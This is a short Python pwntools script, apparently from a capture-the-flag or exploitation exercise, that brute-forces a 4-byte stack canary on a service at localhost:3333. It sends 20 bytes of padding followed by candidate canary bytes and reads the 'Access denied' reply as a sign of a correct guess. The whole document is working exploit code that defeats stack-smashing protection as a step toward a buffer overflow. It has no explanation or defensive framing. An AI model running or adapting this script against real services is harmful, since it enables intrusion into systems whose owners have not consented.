
from pwn import *

canary = ""
result = ""
off_canary = "A"*20
can = [] 


for i in range(4):
	for j in range(256):
		r = remote('localhost', 3333)
		r.send(off_canary + canary + chr(j))
		ans = r.recv()
		if "Access denied" in ans:
			canary += chr(j)
			can.append(chr(j).encode('hex'))
			r.close()
			break
		r.close()

for i in range(3, -1, -1):
	result += can[i]
result = "0x" + result
print "============"
print "Canary: " + result
print "============"





		
